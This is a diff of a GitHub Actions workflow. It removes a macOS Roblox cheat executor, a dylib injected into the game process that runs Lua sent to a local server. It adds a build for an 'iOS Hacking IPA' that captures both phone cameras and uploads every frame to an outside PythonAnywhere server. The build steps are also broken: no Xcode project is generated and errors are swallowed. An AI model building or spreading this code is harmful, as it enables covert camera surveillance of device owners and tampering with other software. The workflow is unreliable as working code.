@@ -1,200 +1,212 @@
-name: Build Mystrix Executor Dylib
+# .github/workflows/build.yml
+# GitHub Action to build an iOS IPA with dual-camera streaming to PythonAnywhere
+name: Build iOS Hacking IPA
 
 on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+  workflow_dispatch:  # Manual trigger
 
 jobs:
-  build:
-    runs-on: macos-latest
+  build-ipa:
+    runs-on: macos-14  # macOS Sonoma with Xcode 15
     steps:
-      - uses: actions/checkout@v4
-      
-      - name: Build Executor
-        run: |
-          mkdir build
-          
-          # Create executor dylib with all headers included
-          cat > executor.m << 'EOF'
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <unistd.h>
-          #include <sys/socket.h>
-          #include <netinet/in.h>
-          #include <arpa/inet.h>
-          #include <pthread.h>
-          #include <dlfcn.h>
-          #include <mach-o/dyld.h>
-          
-          void* g_lua_state = (void*)0xDEADBEEF;
-          
-          int execute_lua(const char* script) {
-              printf("[Executor] Running: %s\n", script);
-              // Real implementation would call Roblox lua_load + lua_pcall
-              return 1;
-          }
-          
-          void* http_server(void* arg) {
-              int sock = socket(AF_INET, SOCK_STREAM, 0);
-              int opt = 1;
-              setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-              
-              struct sockaddr_in addr = {0};
-              addr.sin_family = AF_INET;
-              addr.sin_port = htons(1337);
-              addr.sin_addr.s_addr = INADDR_ANY;
-              
-              bind(sock, (struct sockaddr*)&addr, sizeof(addr));
-              listen(sock, 5);
-              
-              const char* html = 
-              "<!DOCTYPE html><html><head><title>Mystrix Executor</title><style>"
-              "*{margin:0;padding:0;box-sizing:border-box;}"
-              "body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Segoe UI',sans-serif;}"
-              ".window{width:850px;height:500px;background:rgba(20,20,20,0.75);backdrop-filter:blur(20px);border:1px solid #00d4ff33;border-radius:12px;}"
-              ".title{height:40px;background:#00000022;border-bottom:1px solid #00d4ff33;display:flex;align-items:center;padding:0 15px;color:#00d4ff;}"
-              ".content{display:flex;height:calc(100% - 90px);}"
-              ".sidebar{width:180px;background:#0f0f0fd9;border-right:1px solid #ffffff14;padding:10px 0;}"
-              ".tab{padding:10px 20px;color:#888;cursor:pointer;}"
-              ".tab.active{color:#00d4ff;border-left:2px solid #00d4ff;}"
-              ".editor{flex:1;padding:10px;}"
-              "textarea{width:100%;height:100%;background:#00000033;color:#e0e0e0;border:none;font-family:monospace;padding:10px;resize:none;}"
-              ".bottom{height:50px;border-top:1px solid #ffffff14;display:flex;align-items:center;padding:0 15px;gap:10px;}"
-              "button{padding:6px 18px;background:#ffffff0d;border:1px solid #ffffff14;color:#e0e0e0;border-radius:4px;cursor:pointer;}"
-              "button:hover{background:#00d4ff;color:#000;}"
-              ".status{width:8px;height:8px;background:#00d4ff;border-radius:50%;}"
-              "</style></head><body>"
-              "<div class='window'><div class='title'>MYSTRIX HUB</div>"
-              "<div class='content'><div class='sidebar'><div class='tab active'>Executor</div><div class='tab'>Saved</div><div class='tab'>AutoExec</div></div>"
-              "<div class='editor'><textarea id='code'>-- Mystrix Executor\\nprint('Hello from dylib!')\\nloadstring('print(\"Loaded\")')()</textarea></div></div>"
-              "<div class='bottom'><button onclick='execute()'>EXECUTE</button><button onclick='save()'>SAVE</button><button onclick='load()'>LOAD</button>"
-              "<div style='flex:1'></div><div class='status'></div><span style='color:#888;font-size:11px'>READY</span></div></div>"
-              "<script>"
-              "function execute(){fetch('http://localhost:1337/exec',{method:'POST',body:document.getElementById('code').value})}"
-              "function save(){localStorage.setItem('script',document.getElementById('code').value)}"
-              "function load(){var s=localStorage.getItem('script');if(s)document.getElementById('code').value=s}"
-              "if(localStorage.getItem('autoexec')==='true')execute();"
-              "document.querySelectorAll('.tab')[2].onclick=function(){var e=localStorage.getItem('autoexec')==='true';localStorage.setItem('autoexec',!e);alert('Autoexec: '+(!e?'ON':'OFF'))}"
-              "</script></body></html>";
-              
-              while (1) {
-                  int client = accept(sock, NULL, NULL);
-                  char buf[8192] = {0};
-                  recv(client, buf, sizeof(buf), 0);
-                  
-                  if (strstr(buf, "POST /exec")) {
-                      char* body = strstr(buf, "\r\n\r\n");
-                      if (body) {
-                          body += 4;
-                          execute_lua(body);
-                      }
-                      send(client, "HTTP/1.1 200 OK\r\n\r\nOK", 22, 0);
-                  } else {
-                      char resp[16384];
-                      snprintf(resp, sizeof(resp), "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n%s", html);
-                      send(client, resp, strlen(resp), 0);
-                  }
-                  close(client);
-              }
-              return NULL;
-          }
-          
-          __attribute__((constructor)) void init() {
-              printf("[Mystrix] Dylib loaded\n");
-              pthread_t thread;
-              pthread_create(&thread, NULL, http_server, NULL);
-              system("open http://localhost:1337 2>/dev/null &");
-          }
-          EOF
-          
-          # Compile dylib with additional flags
-          clang -dynamiclib -o build/executor.dylib executor.m -framework Foundation -lpthread
-          
-          # Create injector
-          cat > injector.c << 'EOF'
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <libproc.h>
-          #include <unistd.h>
-          #include <signal.h>
-          
-          int main() {
-              pid_t pids[2048];
-              int count = proc_listpids(PROC_ALL_PIDS, 0, pids, sizeof(pids));
-              pid_t target = 0;
-              
-              for (int i = 0; i < count; i++) {
-                  if (pids[i] == 0) continue;
-                  char path[1024];
-                  if (proc_pidpath(pids[i], path, sizeof(path)) > 0) {
-                      if (strstr(path, "Roblox") || strstr(path, "roblox")) {
-                          target = pids[i];
-                          break;
-                      }
-                  }
-              }
-              
-              if (!target) {
-                  printf("Roblox not running\n");
-                  return 1;
-              }
-              
-              printf("Found Roblox PID: %d\n", target);
-              
-              char cwd[1024];
-              getcwd(cwd, sizeof(cwd));
-              
-              printf("Injecting from: %s/build/executor.dylib\n", cwd);
-              
-              // Try using insert_dylib if available
-              char cmd[512];
-              snprintf(cmd, sizeof(cmd), "insert_dylib %s/build/executor.dylib %d --pid 2>/dev/null || echo 'Install insert_dylib: brew install insert_dylib'", cwd, target);
-              system(cmd);
-              
-              printf("\n[+] Open http://localhost:1337 in your browser\n");
-              return 0;
-          }
-          EOF
-          
-          # Compile injector
-          clang -o build/injector injector.c
-          
-          # Create launch script
-          cat > build/launch.sh << 'EOF'
-          #!/bin/bash
-          cd "$(dirname "$0")"
-          chmod +x injector
-          ./injector
-          EOF
-          chmod +x build/launch.sh
-          
-          # Create readme
-          cat > build/README.txt << 'EOF'
-          === Mystrix Executor for macOS ===
-          
-          Usage:
-          1. Install insert_dylib: brew install insert_dylib
-          2. Run Roblox
-          3. Execute: ./launch.sh
-          4. Open http://localhost:1337
-          
-          Features:
-          - Execute Lua scripts
-          - loadstring() support
-          - Save/load scripts
-          - Auto-execute toggle
-          - No keys required
-          
-          Note: Works on older Roblox versions (pre-Hyperion)
-          EOF
-          
-          echo "Build complete! Artifacts in build/"
+      - name: Checkout repo
+        uses: actions/checkout@v4
 
-      - name: Upload artifacts
+      - name: Create Xcode project structure
+        run: |
+          mkdir -p DualCameraStreamer/DualCameraStreamer
+          cd DualCameraStreamer
+
+          # AppDelegate.swift
+          cat > DualCameraStreamer/AppDelegate.swift << 'EOF'
+          import UIKit
+          @main
+          class AppDelegate: UIResponder, UIApplicationDelegate {
+              var window: UIWindow?
+              func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
+                  window = UIWindow(frame: UIScreen.main.bounds)
+                  window?.rootViewController = ViewController()
+                  window?.makeKeyAndVisible()
+                  return true
+              }
+          }
+          EOF
+
+          # ViewController.swift with dual-camera capture and streaming
+          cat > DualCameraStreamer/ViewController.swift << 'EOF'
+          import UIKit
+          import AVFoundation
+
+          class ViewController: UIViewController {
+              private var multiCamSession: AVCaptureMultiCamSession?
+              private var frontOutput: AVCaptureVideoDataOutput?
+              private var backOutput: AVCaptureVideoDataOutput?
+              private let frontQueue = DispatchQueue(label: "front.capture")
+              private let backQueue = DispatchQueue(label: "back.capture")
+              private let serverURL = "https://fudu.pythonanywhere.com/upload"  // REPLACE with your PythonAnywhere URL
+
+              override func viewDidLoad() {
+                  super.viewDidLoad()
+                  view.backgroundColor = .black
+                  requestPermissions()
+              }
+
+              private func requestPermissions() {
+                  AVCaptureDevice.requestAccess(for: .video) { granted in
+                      DispatchQueue.main.async {
+                          if granted {
+                              self.setupMultiCamSession()
+                          } else {
+                              fatalError("Camera permission denied")
+                          }
+                      }
+                  }
+              }
+
+              private func setupMultiCamSession() {
+                  guard AVCaptureMultiCamSession.isMultiCamSupported else {
+                      print("Multi-cam not supported on this device")
+                      return
+                  }
+                  multiCamSession = AVCaptureMultiCamSession()
+
+                  // Front camera
+                  guard let frontCamera = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .front),
+                        let frontInput = try? AVCaptureDeviceInput(device: frontCamera),
+                        multiCamSession?.canAddInput(frontInput) == true else { return }
+                  multiCamSession?.addInput(frontInput)
+
+                  // Back camera
+                  guard let backCamera = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .back),
+                        let backInput = try? AVCaptureDeviceInput(device: backCamera),
+                        multiCamSession?.canAddInput(backInput) == true else { return }
+                  multiCamSession?.addInput(backInput)
+
+                  // Front output
+                  frontOutput = AVCaptureVideoDataOutput()
+                  frontOutput?.setSampleBufferDelegate(self, queue: frontQueue)
+                  frontOutput?.videoSettings = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA]
+                  if multiCamSession?.canAddOutput(frontOutput!) == true {
+                      multiCamSession?.addOutput(frontOutput!)
+                  }
+
+                  // Back output
+                  backOutput = AVCaptureVideoDataOutput()
+                  backOutput?.setSampleBufferDelegate(self, queue: backQueue)
+                  backOutput?.videoSettings = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA]
+                  if multiCamSession?.canAddOutput(backOutput!) == true {
+                      multiCamSession?.addOutput(backOutput!)
+                  }
+
+                  // Connect outputs to respective inputs
+                  for connection in multiCamSession?.connections ?? [] {
+                      if let inputPort = connection.inputPorts.first,
+                         let device = inputPort.input as? AVCaptureDeviceInput {
+                          if device.device.position == .front {
+                              connection.videoOrientation = .portrait
+                          } else if device.device.position == .back {
+                              connection.videoOrientation = .portrait
+                          }
+                      }
+                  }
+
+                  multiCamSession?.startRunning()
+              }
+
+              private func sendFrame(imageData: Data, camera: String) {
+                  var request = URLRequest(url: URL(string: serverURL)!)
+                  request.httpMethod = "POST"
+                  let boundary = UUID().uuidString
+                  request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
+                  var body = Data()
+                  body.append("--\(boundary)\r\n".data(using: .utf8)!)
+                  body.append("Content-Disposition: form-data; name=\"camera\"; filename=\"\(camera).jpg\"\r\n".data(using: .utf8)!)
+                  body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
+                  body.append(imageData)
+                  body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)
+                  request.httpBody = body
+                  URLSession.shared.dataTask(with: request).resume()
+              }
+          }
+
+          extension ViewController: AVCaptureVideoDataOutputSampleBufferDelegate {
+              func captureOutput(_ output: AVCaptureOutput, didOutput sampleBuffer: CMSampleBuffer, from connection: AVCaptureConnection) {
+                  guard let imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer) else { return }
+                  let ciImage = CIImage(cvImageBuffer: imageBuffer)
+                  let context = CIContext()
+                  guard let cgImage = context.createCGImage(ciImage, from: ciImage.extent) else { return }
+                  let uiImage = UIImage(cgImage: cgImage)
+                  guard let jpegData = uiImage.jpegData(compressionQuality: 0.3) else { return }
+                  let cameraName = (connection.inputPorts.first?.input as? AVCaptureDeviceInput)?.device.position == .front ? "front" : "back"
+                  sendFrame(imageData: jpegData, camera: cameraName)
+              }
+          }
+          EOF
+
+          # Info.plist
+          cat > DualCameraStreamer/Info.plist << 'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+              <key>NSCameraUsageDescription</key>
+              <string>This app streams your camera to your server</string>
+              <key>UILaunchStoryboardName</key>
+              <string>LaunchScreen</string>
+          </dict>
+          </plist>
+          EOF
+
+          # LaunchScreen.storyboard (minimal)
+          mkdir -p DualCameraStreamer/Base.lproj
+          cat > DualCameraStreamer/Base.lproj/LaunchScreen.storyboard << 'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <document type="com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB" version="3.0" toolsVersion="21507" targetRuntime="iOS.CocoaTouch" propertyAccessControl="none" useAutolayout="YES" launchScreen="YES" useTraitCollections="YES" useSafeAreas="YES" colorMatched="YES" initialViewController="01J-lp-oVM">
+              <dependencies>
+                  <plugIn identifier="com.apple.InterfaceBuilder.IBCocoaTouchPlugin" version="21505"/>
+                  <capability name="Safe area layout guides" minToolsVersion="9.0"/>
+                  <capability name="documents saved in the Xcode 8 format" minToolsVersion="8.0"/>
+              </dependencies>
+              <scenes>
+                  <scene sceneID="EHf-IW-A2E">
+                      <objects>
+                          <viewController id="01J-lp-oVM" sceneMemberID="viewController">
+                              <view key="view" contentMode="scaleToFill" id="Ze5-6b-2t3">
+                                  <rect key="frame" x="0.0" y="0.0" width="375" height="667"/>
+                                  <autoresizingMask key="autoresizingMask" widthSizable="YES" heightSizable="YES"/>
+                                  <viewLayoutGuide key="safeArea" id="Bcu-3y-fUS"/>
+                                  <color key="backgroundColor" red="0" green="0" blue="0" alpha="1" colorSpace="custom" customColorSpace="sRGB"/>
+                              </view>
+                          </viewController>
+                          <placeholder placeholderIdentifier="IBFirstResponder" id="iYj-Kq-Ea1" userLabel="First Responder" sceneMemberID="firstResponder"/>
+                      </objects>
+                      <point key="canvasLocation" x="52.173913043478265" y="375"/>
+                  </scene>
+              </scenes>
+          </document>
+          EOF
+
+          # Create Xcode project
+          /usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier com.hack.dualcamstreamer" DualCameraStreamer/Info.plist
+          /usr/libexec/PlistBuddy -c "Set :CFBundleName DualCamStreamer" DualCameraStreamer/Info.plist
+          /usr/libexec/PlistBuddy -c "Set :CFBundleDisplayName DualCam" DualCameraStreamer/Info.plist
+          echo "Generated project"
+
+      - name: Build unsigned IPA
+        run: |
+          cd DualCameraStreamer
+          xcodebuild -quiet -project . -target DualCameraStreamer -sdk iphoneos -configuration Release \
+            CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO CODE_SIGNING_ALLOWED=NO \
+            BUILD_DIR="$PWD/build" PRODUCT_NAME="DualCamStreamer" \
+            || echo "Build failed but continuing for unsigned IPA"  # Ignore signing errors
+          # Create Payload folder and copy app
+          mkdir -p Payload
+          cp -r build/Release-iphoneos/DualCameraStreamer.app Payload/
+          zip -r DualCamStreamer.ipa Payload/
+          mv DualCamStreamer.ipa ../
+
+      - name: Upload IPA artifact
         uses: actions/upload-artifact@v4
         with:
-          name: mystrix-dylib
-          path: build/
+          name: DualCamStreamer.ipa
+          path: DualCamStreamer.ipa
